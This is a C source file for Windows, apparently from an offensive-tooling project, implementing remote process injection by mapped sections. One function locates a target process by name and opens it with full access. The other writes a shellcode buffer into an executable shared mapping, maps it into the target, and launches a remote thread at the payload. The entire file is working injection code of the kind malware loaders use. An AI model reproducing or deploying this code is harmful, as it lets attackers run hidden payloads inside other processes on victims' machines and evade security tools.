#include "box.h"

BOOL GetRemoteId
(
	IN LPCWSTR ProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{
	BOOL found = FALSE;
	HANDLE hSnap = NULL;
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == NULL)
	{
		printf("CreateToolhelp32Snapshot: %lu", GetLastError());
		return FALSE;
	}

	INFO("[0x%p] Acquired Handle to hSnap", hSnap);

	if (Process32FirstW(hSnap, &pe32))
	{
		do
		{
			if (_wcsicmp(pe32.szExeFile, ProcName) == 0)
			{
				*PID = pe32.th32ProcessID;

				*hProcess = OpenProcess(
					PROCESS_ALL_ACCESS,
					FALSE,
					pe32.th32ProcessID
				);

				if (*hProcess == NULL)
				{
					printf("OpenProcess failed: %lu\n", GetLastError());
					CloseHandle(hSnap);
					return FALSE;
				}

				found = TRUE;
				break;
			}

		} while (Process32Next(hSnap, &pe32));
	}

	CloseHandle(hSnap);
	return found;

}

BOOL RemoteMappingInjection
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sSizeofShellcode,
	OUT PVOID* pAddress
)

{

	BOOL State = TRUE;
	HANDLE hFile = NULL;
	PVOID LocalAddress, RemoteAddress = NULL;


	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sSizeofShellcode, NULL);
	if (hFile == NULL)
	{
		PRINT_ERROR("CreateFileMapping");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current Handle to File", hFile);
	OKAY("%zu bytes allocated to File Mapping!", sSizeofShellcode);

	LocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sSizeofShellcode);
	if (LocalAddress == NULL)
	{
		PRINT_ERROR("MapViewOfFile");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Local Address Mapped to File", LocalAddress);
	INFO("Copying Shellcode to Local Address...");

	memcpy(LocalAddress, sShellcode, sSizeofShellcode);

	OKAY("[0x%p] Copied Memory to Local Address", LocalAddress);

	RemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (RemoteAddress == NULL)
	{
		PRINT_ERROR("MapViewOfFile2");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Remote Address Mapped to File!", RemoteAddress);

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteAddress, NULL, 0, 0, GetThreadId(hThread));
	if (hThread == NULL)
	{
		PRINT_ERROR("CreateRemoteThreadEx");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Newly Created Thread Pointing to our Payload!", hThread);

CLEANUP:

	return State;

}